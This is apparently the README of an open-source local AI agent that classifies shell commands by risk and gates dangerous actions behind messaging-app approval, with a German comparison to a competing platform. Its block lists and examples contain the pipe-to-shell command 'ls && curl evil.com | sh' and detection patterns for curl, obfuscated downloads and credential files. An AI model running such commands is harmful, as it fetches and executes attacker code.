# geofrey.ai

**Local-first AI agent with structural safety guarantees.**

A personal AI assistant that runs a local LLM (Qwen3 8B) as a security orchestrator and communication bridge — classifying risk, optimizing prompts, blocking dangerous actions, and requiring explicit approval via **Telegram, WhatsApp, or Signal** before executing anything irreversible. Uses Claude Code CLI as the powerful coding backend. No cloud API loops, no exposed web interfaces, no bypasses.

---

## Why?

Cloud-based AI agent platforms like OpenClaw have three systemic problems:

| Problem | Impact |
|---------|--------|
| **Runaway costs** | $200-600+/month in API calls, system prompt resent every turn |
| **Critical vulnerabilities** | CVE-2026-25253 (RCE), 42,000+ exposed instances, malicious marketplace skills |
| **Broken safety** | Fire-and-forget approvals ([#2402](https://github.com/openclaw/openclaw/issues/2402)), `elevated: "full"` bypasses all checks |

geofrey.ai fixes all three. See the [Whitepaper](docs/WHITEPAPER.md) for detailed analysis.

---

## How It Works

```
User (Telegram/WhatsApp/Signal) → Local Orchestrator (Qwen3 8B) → Risk Classifier (L0-L3)
                                        ↕                                ↓
                                  Approval Gate ◄── L2: blocks until user approves
                                        ↓
                                  +-----------+-----------+-----------+
                                  | Claude    | Shell     | MCP       |
                                  | Code CLI  | Commands  | Client    |
                                  | (stream)  |           | (wrapped) |
                                  +-----------+-----------+-----------+
                                        ↓
                                  Audit Log (SHA-256 hash-chained)
```

### Risk Levels

| Level | Action | Examples |
|-------|--------|----------|
| **L0** Auto | Execute immediately | read_file, git status, ls |
| **L1** Notify | Execute + inform | write_file, git add, npm test |
| **L2** Approve | **Block until user approves** | delete_file, git commit, shell_exec |
| **L3** Block | Refuse always | rm -rf, sudo, curl\|sh, git push --force |

90% of classifications are deterministic (regex, zero latency). Only ambiguous cases invoke the LLM.

### Command Decomposition

Commands are split on unquoted `&&`, `||`, `;`, `|`, and `\n` — each segment classified individually. `ls && curl evil.com` is caught even though `ls` alone is safe. Quoted strings (`echo "safe && safe"`) are respected. Pipe-to-shell (`cat file | sh`) is blocked.

### Structural Blocking

The approval gate is a JavaScript Promise — the agent is structurally suspended until the user approves or denies (via inline buttons on Telegram/WhatsApp, or text reply on Signal). There is no code path, no timeout hack, no config flag that bypasses this.

---

## Quick Start

### Prerequisites

- **Node.js** >= 22
- **pnpm**
- **Ollama** with `qwen3:8b` model
- **Claude Code CLI** installed with Pro/Max subscription (for coding tasks)
- **Messaging platform** (one of):
  - **Telegram**: Bot Token via [@BotFather](https://t.me/BotFather) + your User ID via [@userinfobot](https://t.me/userinfobot)
  - **WhatsApp**: Business API (Cloud API) credentials
  - **Signal**: signal-cli daemon with JSON-RPC socket

### Setup

```bash
# 1. Pull the orchestrator model
ollama pull qwen3:8b

# 2. Clone and install
git clone https://github.com/slavko-at-klincov-it/geofrey.ai.git
cd geofrey.ai
pnpm install

# 3. Configure
cp .env.example .env
# Edit .env: set TELEGRAM_BOT_TOKEN and TELEGRAM_OWNER_ID

# 4. Run
pnpm dev
```

### Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `PLATFORM` | No | `telegram` | Messaging platform: `telegram`, `whatsapp`, or `signal` |
| `TELEGRAM_BOT_TOKEN` | Telegram | — | Bot token from @BotFather |
| `TELEGRAM_OWNER_ID` | Telegram | — | Your Telegram user ID |
| `WHATSAPP_PHONE_NUMBER_ID` | WhatsApp | — | Business phone number ID |
| `WHATSAPP_ACCESS_TOKEN` | WhatsApp | — | Permanent access token |
| `WHATSAPP_VERIFY_TOKEN` | WhatsApp | — | Webhook verification token |
| `WHATSAPP_OWNER_PHONE` | WhatsApp | — | Owner phone number (e.g. `491234567890`) |
| `WHATSAPP_WEBHOOK_PORT` | No | `3000` | Webhook server port |
| `SIGNAL_CLI_SOCKET` | No | `/var/run/signal-cli/socket` | signal-cli JSON-RPC socket path |
| `SIGNAL_OWNER_PHONE` | Signal | — | Owner phone (e.g. `+491234567890`) |
| `SIGNAL_BOT_PHONE` | Signal | — | Bot's Signal number |
| `ORCHESTRATOR_MODEL` | No | `qwen3:8b` | Ollama model name |
| `OLLAMA_BASE_URL` | No | `http://localhost:11434` | Ollama API URL |
| `DATABASE_URL` | No | `./data/app.db` | SQLite database path |
| `AUDIT_LOG_DIR` | No | `./data/audit` | Audit log directory |
| `MCP_SERVERS` | No | — | JSON array of MCP server configs |
| `MCP_ALLOWED_SERVERS` | No | — | Comma-separated allowlist of MCP server names |

#### Claude Code CLI

Requires [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed with an active Pro/Max subscription.

| Variable | Default | Description |
|----------|---------|-------------|
| `CLAUDE_CODE_ENABLED` | `true` | Enable/disable Claude Code integration |
| `CLAUDE_CODE_SKIP_PERMISSIONS` | `true` | Use `--dangerously-skip-permissions` (required for non-interactive) |
| `CLAUDE_CODE_MODEL` | `claude-sonnet-4-5-20250929` | Model for coding tasks |
| `CLAUDE_CODE_TIMEOUT_MS` | `600000` | Timeout per invocation (10 min) |
| `CLAUDE_CODE_MAX_BUDGET_USD` | — | Optional spend cap per invocation |
| `CLAUDE_CODE_DEFAULT_DIRS` | — | Comma-separated additional working directories |
| `CLAUDE_CODE_MCP_CONFIG` | — | Path to MCP config for Claude Code |

**Tool profiles** are automatically scoped by risk level:

| Risk Level | Tools Available |
|------------|----------------|
| L0 (read-only) | Read, Glob, Grep |
| L1 (standard) | Read, Glob, Grep, Edit, Write, Bash(git:*) |
| L2 (full) | Read, Glob, Grep, Edit, Write, Bash |

---

## Architecture

```
src/
├── index.ts                  # Entry point, health checks, graceful shutdown
├── orchestrator/
│   ├── agent-loop.ts         # Vercel AI SDK 6 generateText/streamText + approval flow
│   ├── conversation.ts       # Multi-turn memory (in-memory + SQLite)
│   └── prompt-generator.ts   # Task templates for downstream models
├── approval/
│   ├── risk-classifier.ts    # Hybrid: deterministic regex (90%) + LLM (10%)
│   ├── approval-gate.ts      # Promise-based blocking gate with nonce IDs
│   ├── action-registry.ts    # Action definitions + default risk levels
│   └── execution-guard.ts    # Final revocation check before execution
├── messaging/
│   ├── platform.ts           # MessagingPlatform interface + types
│   ├── create-platform.ts    # Async factory: config → adapter
│   ├── streamer.ts           # Platform-agnostic token streaming
│   └── adapters/
│       ├── telegram.ts       # grammY bot + approval UI (inline buttons)
│       ├── whatsapp.ts       # WhatsApp Business API (Cloud API, webhook)
│       └── signal.ts         # signal-cli JSON-RPC (text-based approvals)
├── tools/
│   ├── tool-registry.ts      # Native + MCP tool registry → AI SDK bridge
│   ├── mcp-client.ts         # MCP server discovery + tool wrapping
│   ├── claude-code.ts        # Claude Code CLI subprocess driver
│   ├── shell.ts              # Shell command executor
│   ├── filesystem.ts         # File read/write/delete/list
│   └── git.ts                # Git status/log/diff/commit
├── audit/
│   └── audit-log.ts          # Hash-chained JSONL (SHA-256, tamper-evident)
├── db/
│   ├── client.ts             # SQLite + Drizzle ORM setup
│   └── schema.ts             # Table definitions
└── config/
    ├── defaults.ts           # Env var loader
    └── schema.ts             # Zod config validation
```

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full system design.

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Language | TypeScript (Node.js 22+) |
| Orchestrator | Qwen3 8B via Ollama (upgradable to 14B) |
| Coding Agent | Claude Code CLI (stream-json, sessions, risk-scoped tool profiles) |
| LLM SDK | Vercel AI SDK 6 (`generateText`, `streamText`, `tool` with `needsApproval`) |
| Tool Integration | MCP Client (10K+ servers, wrapped by risk classifier) |
| Messaging | Telegram (grammY), WhatsApp (Cloud API), Signal (signal-cli) |
| Database | SQLite + Drizzle ORM |
| Audit | Append-only hash-chained JSONL (with Claude Code cost/token tracking) |
| Validation | Zod |

### Hardware Tiers

| Tier | RAM | Model | Cost |
|------|-----|-------|------|
| Minimum | 18GB+ (M-series Mac) | Qwen3 8B (5GB) | $0/month |
| Standard | 32GB+ | Qwen3 14B (9GB) | $0/month |
| Power | 96GB+ | Qwen3 14B + Qwen3-Coder-Next (61GB) | $0/month |

---

## Security

### OWASP Agentic AI Top 10

Full coverage documented in [docs/WHITEPAPER.md](docs/WHITEPAPER.md).

---

## MCP Servers

Connect any MCP-compatible tool server:

```bash
# Via environment variable
MCP_SERVERS='[{"name":"filesystem","command":"npx","args":["-y","@modelcontextprotocol/server-filesystem","/home/user"]}]' pnpm dev
```

All MCP tool calls are automatically routed through the risk classifier. The MCP ecosystem provides 10,000+ tool servers — geofrey.ai wraps them all with L0-L3 safety guarantees.

---

## Development

```bash
pnpm dev          # Run with hot reload (tsx watch)
pnpm build        # TypeScript compilation
pnpm lint         # Type check (tsc --noEmit)
pnpm test         # 128 tests across 15 modules
pnpm start        # Run compiled output
pnpm db:generate  # Generate Drizzle migrations
```

---

## Project Status

**128 tests passing** across 15 modules.

- [x] Local LLM orchestrator (Qwen3 8B)
- [x] Hybrid risk classification (deterministic + LLM, XML output)
- [x] Shlex-style command decomposition (prevents chained command bypass)
- [x] Structural approval gate (Promise-based blocking)
- [x] Multi-platform messaging (Telegram, WhatsApp, Signal)
- [x] Tool executors (shell, filesystem, git)
- [x] Claude Code CLI integration (stream-json, sessions, tool scoping, live streaming)
- [x] Prompt optimizer (8 templates, risk-scoped tool profiles)
- [x] 4-way intent classification (QUESTION / SIMPLE_TASK / CODING_TASK / AMBIGUOUS)
- [x] MCP client integration (allowlist, output sanitization)
- [x] Hash-chained audit log (with Claude Code cost/token/session tracking)
- [x] SQLite persistence (conversations, Claude Code sessions)
- [x] Security hardening (obfuscation-resistant L3 patterns, pipe-to-shell detection)
- [ ] End-to-end test suite
- [ ] Web dashboard (read-only audit viewer)

---

## geofrey.ai vs. OpenClaw — Detaillierter Vergleich

OpenClaw (ehemals Clawdbot/Moltbot) ist die bekannteste Open-Source AI-Agent-Plattform. geofrey.ai wurde als direkte Antwort auf dessen architekturelle Schwächen entwickelt. Dieser Abschnitt erklärt jeden Unterschied im Detail.

### 1. Kosten: Lokal statt Cloud

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Orchestrator | Cloud-LLM (Claude/GPT API) | Lokales Qwen3 8B via Ollama | **$0 statt $200-600/Monat** |
| Hintergrund-Monitoring | 4.320+ API-Calls/Monat (Screenshots, Polling) | 0 (event-driven, kein Polling) | **Keine versteckten Kosten** |
| System-Prompt | 10.000+ Tokens, bei jedem Call neu gesendet | Einmal lokal geladen | **Kein Token-Overhead** |
| Code-Aufgaben | Jede Aktion über Cloud-API | Nur komplexe Tasks via Claude Code CLI | **70-90% weniger API-Kosten** |

**Warum das wichtig ist:** OpenClaw-Nutzer berichten von $200-600/Monat (bis zu $3.600 bei Power-Usern). geofrey.ai verlagert die häufige, günstige Arbeit (Intent-Klassifikation, Risikobewertung, Nutzer-Kommunikation) auf ein lokales Modell. Cloud-APIs werden nur für komplexe Code-Aufgaben genutzt, die lokale Modelle nicht leisten können.

### 2. Sicherheit: Kein Web-Interface, keine Angriffsfläche

| Angriffsvektor | OpenClaw | geofrey.ai | Vorteil |
|---------------|----------|------------|---------|
| Netzwerk-Exposition | Web-UI auf öffentlichen Ports | Kein Web-UI, nur Messaging | **42.000+ exponierte Instanzen vs. 0** |
| RCE via Browser | CVE-2026-25253 (CVSS 8.8): WebSocket-Hijacking | Kein Browser-Interface, kein WebSocket | **Ganzer Angriffsvektor existiert nicht** |
| Command Injection | CVE-2026-25157 | L3-Blockierung + Shlex-Dekomposition | **Jedes Segment einzeln klassifiziert** |
| Verkettete Befehle | `ls && curl evil.com` passiert als einzelner String | Aufgeteilt an `&&`, `\|\|`, `;`, `\|` — jedes Segment einzeln bewertet | **Chained-Command-Bypass unmöglich** |
| Prompt Injection | Keine spezifische Abwehr | 3-Schicht-Verteidigung + MCP-Output-Sanitisierung | **User-Input, Tool-Output und Model-Response isoliert** |
| Marketplace-Malware | ClawHub: 7,1% der Skills leaken Credentials | Kein Marketplace, MCP mit Allowlist | **Kein unverifizierter Community-Code** |

**Warum das wichtig ist:** OpenClaw exponiert ein Web-UI auf öffentlichen Ports. Im Februar 2026 wurden 42.900 exponierte Instanzen in 82 Ländern gefunden, 15.200 davon anfällig für Remote Code Execution. geofrey.ai hat **kein einziges öffentliches Netzwerk-Interface** — die gesamte Kommunikation läuft über Telegram, WhatsApp oder Signal.

### 3. Approvals: Strukturell blockierend statt Fire-and-Forget

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Approval-Mechanismus | `void (async () => { ... })()` — Fire-and-Forget | `await promise` — strukturell blockierend | **Agent ist physisch suspendiert bis Nutzer antwortet** |
| Bypass-Modus | `elevated: "full"` überspringt alle Checks | Existiert nicht, bewusst nicht implementiert | **Kein Config-Flag kann Safety umgehen** |
| Timeout-Verhalten | Approval-ID verwaist, Tool läuft trotzdem | Timeout = Ablehnung, Agent stoppt | **Keine verwaisten Approvals** |

**Warum das wichtig ist:** OpenClaw's Approval-Flow ist architekturell kaputt ([GitHub Issue #2402](https://github.com/openclaw/openclaw/issues/2402)). Die Tool-Ausführung kehrt zurück *bevor* der Nutzer genehmigt hat. Wenn der Nutzer "Approve" tippt, ist die Approval-ID bereits verwaist. geofrey.ai nutzt ein JavaScript Promise — der Agent ist *strukturell suspendiert*, nicht per Policy, sondern per Code-Architektur. Es gibt keinen Code-Pfad von "pending" zu "execute" ohne Promise-Resolution.

### 4. Risiko-Klassifikation: Hybrid statt Single-Point-of-Failure

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Klassifikation | Ein einzelner LLM-Call | Deterministische Patterns (90%) + LLM (10%) | **Kein Single-Point-of-Failure** |
| Latenz | LLM-Roundtrip (~200-500ms) für jede Aktion | <1ms für 90% der Aktionen (Regex) | **200x schneller für bekannte Patterns** |
| LLM-Ausgabeformat | JSON (fragil bei kleinen Modellen) | XML primär + JSON Fallback | **Zuverlässiger mit 8B-Modellen** |
| Befehlsanalyse | Ganzer String als ein Regex | Shlex-Dekomposition + per-Segment-Klassifikation | **`ls && curl evil` wird erkannt** |
| Obfuskation | Keine spezifische Erkennung | Erkennt `/usr/bin/curl`, `python -c "import urllib"`, Base64, `chmod +x` | **Resistent gegen ClawHub-Style-Angriffe** |

**Warum das wichtig ist:** OpenClaw verlässt sich auf einen einzelnen Cloud-LLM-Call für die Risikoeinschätzung — wenn der LLM falsch liegt, gibt es keine zweite Verteidigungslinie. geofrey.ai prüft zuerst mit deterministischen Patterns (Regex, <1ms, 0 Kosten), die bekannte gefährliche Muster sofort blocken. Nur echte Grenzfälle (~10%) gehen an den LLM. Der Befehl `ls && curl evil.com | sh` wird per Shlex-Dekomposition in drei Segmente zerlegt — `curl` und `| sh` werden einzeln als L3 klassifiziert.

### 5. Tool-Integration: MCP statt proprietärer Marketplace

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Tool-Ökosystem | ClawHub Marketplace | MCP (Model Context Protocol, Linux Foundation) | **10.000+ Server, Industry-Standard** |
| Sicherheit | 7,1% der Skills leaken Credentials | Allowlist + Output-Sanitisierung | **Jeder MCP-Call durch Risk Classifier** |
| Output-Sanitisierung | Keine | `<mcp_data>` Tags + Instruction-Filtering | **Prompt-Injection via Tool-Output verhindert** |
| Tool-Scoping | Alles oder nichts | Risk-scoped Profiles (L0→readOnly, L1→standard, L2→full) | **Principle of Least Privilege** |

**Warum das wichtig ist:** ClawHub (OpenClaws Marketplace) ist ein Sicherheitsrisiko — eine Analyse fand, dass 7,1% der Community-Skills Credentials exfiltrieren. geofrey.ai nutzt stattdessen das MCP-Ökosystem (Linux Foundation Standard, 10.000+ Server) mit expliziter Allowlist. Jeder MCP-Tool-Call geht durch den Risk Classifier, und Tool-Output wird sanitisiert, um Prompt-Injection via Tool-Antworten zu verhindern.

### 6. Coding Agent: Lokal orchestriert, Claude Code als Backend

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Code-Generierung | Cloud-LLM direkt | Claude Code CLI (stream-json, Sessions, Tool-Scoping) | **Spezialisierter Coding-Agent statt generischer LLM** |
| Prompt-Optimierung | Keine | 8 Task-Templates (bug_fix, refactor, debugging, ...) | **Fokussierte Prompts → bessere Ergebnisse** |
| Intent-Klassifikation | Binär (Frage/Aufgabe) | 4-Wege (QUESTION / SIMPLE_TASK / CODING_TASK / AMBIGUOUS) | **Richtige Routing-Entscheidung** |
| Session-Management | Keines | Multi-Turn via `--session-id` (1h TTL) | **Kontext bleibt über mehrere Interaktionen** |
| Live-Streaming | Nein | Echtzeit-Updates via Messaging | **Nutzer sieht Fortschritt sofort** |
| Audit | Keine Kostentrackung | Kosten, Tokens, Model, Session-ID pro Aufruf | **Volle Transparenz über API-Ausgaben** |

**Warum das wichtig ist:** OpenClaw schickt jeden Request direkt an einen Cloud-LLM. geofrey.ai nutzt den lokalen LLM als intelligenten Router: Einfache Aufgaben (git status, Datei lesen) werden lokal erledigt, komplexe Coding-Tasks an Claude Code CLI delegiert — mit optimierten Prompts, eingeschränkten Tool-Profilen und Session-Tracking. Das spart Kosten und verbessert die Ergebnisqualität.

### 7. Messaging: Multi-Plattform statt UI-Sicherheitslücke

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Primäres Interface | Web-UI (CVE-2026-25253) | Telegram, WhatsApp, Signal | **Keine Web-Angriffsfläche** |
| Approval-UI | Browser-basiert | Inline-Buttons (Telegram/WhatsApp) oder Text-Reply (Signal) | **Nutzer muss kein Web-UI öffnen** |
| Datenschutz | Cloud-Server verarbeitet alle Daten | Lokaler Server, Messaging als Transport | **Daten verlassen nicht den lokalen Rechner** |
| End-to-End-Verschlüsselung | Nein (Web-UI) | Signal: E2EE, WhatsApp: E2EE, Telegram: optional | **Kommunikationskanal kann verschlüsselt sein** |

**Warum das wichtig ist:** OpenClaws Web-UI ist gleichzeitig das größte Sicherheitsrisiko — CVE-2026-25253 ermöglicht Remote Code Execution über Cross-Site WebSocket Hijacking. geofrey.ai eliminiert diesen gesamten Angriffsvektor, indem es kein Web-Interface gibt. Approvals kommen über verschlüsselte Messaging-Plattformen, die der Nutzer bereits täglich verwendet.

### 8. Audit: Manipulationssicher statt Plain-Text

| | OpenClaw | geofrey.ai | Vorteil |
|---|----------|------------|---------|
| Audit-Format | Plain-Text-Logs | Hash-chained JSONL (SHA-256) | **Manipulation erkennbar** |
| Verkettung | Keine | Jeder Eintrag enthält Hash des vorherigen | **Einzelne Manipulation bricht die Kette** |
| Kostentracking | Keine | USD, Tokens, Model, Session-ID pro Aufruf | **Volle Kostentransparenz** |
| Verifizierung | Manuelle Prüfung | `verifyChain()` — programmatische Integritätsprüfung | **Automatisch verifizierbar** |

**Warum das wichtig ist:** Wenn ein AI-Agent mit Dateien, Git und Shell arbeitet, muss jede Aktion nachvollziehbar sein. OpenClaws Logs sind Plain-Text — eine manipulierte Zeile fällt nicht auf. geofrey.ai verkettet jeden Audit-Eintrag mit dem SHA-256-Hash des vorherigen. Eine einzige Manipulation bricht die gesamte Kette und ist sofort detektierbar.

---

### Zusammenfassung

| Bereich | OpenClaw-Problem | geofrey.ai-Lösung |
|---------|-----------------|-------------------|
| **Kosten** | $200-600/Monat Cloud-API | $0 lokaler Orchestrator + selektive API |
| **Sicherheit** | 42K exponierte Instanzen, 2 CVEs | Kein Web-UI, kein WebSocket, kein öffentlicher Port |
| **Approvals** | Fire-and-Forget (Issue #2402) | Promise-basiertes strukturelles Blocking |
| **Klassifikation** | Single LLM Call | Hybrid: Deterministic (90%) + LLM (10%) |
| **Marketplace** | 7,1% leaken Credentials | MCP mit Allowlist + Output-Sanitisierung |
| **Audit** | Plain-Text | SHA-256-verkettet, manipulationssicher |
| **Messaging** | Web-UI (RCE-anfällig) | Telegram + WhatsApp + Signal |

### Was wir bewusst NICHT bauen

| Feature | Begründung |
|---------|-----------|
| Permission-Bypass-Modus | Ein Bypass ist eine Schwachstelle, kein Feature. OpenClaws `elevated: "full"` ist das beste Beispiel. |
| Web-UI | Null öffentliche Endpoints = null Web-Angriffsfläche. CVE-2026-25253 wäre bei uns unmöglich. |
| Öffentlicher Marketplace | MCP-Ökosystem mit Allowlist statt unverifiziertem Community-Code. ClawHubs 7,1% Credential-Leaks sind inakzeptabel. |
| Auto-Retry nach Ablehnung | Timeout = Ablehnung. Der Agent darf ohne neuen User-Input nicht erneut versuchen. |
| Klartext-Credential-Speicherung | Sensible Pfade (.env, .ssh, .pem) sind L3-blockiert — der Agent kann sie nicht lesen. |

### Bekannte Einschränkungen

- **Keine Execution-Sandbox** — verlässt sich auf Claude Codes eigene Sandboxing-Mechanismen
- **Single-User** — persönlicher Agent, beschränkt auf Owner-ID/Telefonnummer
- **Kein Offline-Modus** — Messaging-Plattform erforderlich für Approvals
- **Orchestrator-Ceiling** — Qwen3 8B bei 0.933 F1 (Upgrade auf 14B mit 0.971 F1 auf 32GB+ Systemen)

---

## Docs

- [Architecture](docs/ARCHITECTURE.md) — Full system design, dataflow, risk levels
- [Orchestrator Prompts](docs/ORCHESTRATOR_PROMPT.md) — 4 focused prompts for Qwen3
- [Whitepaper](docs/WHITEPAPER.md) — Security analysis, cost comparison, market opportunity

---

## License

Open Source — License TBD
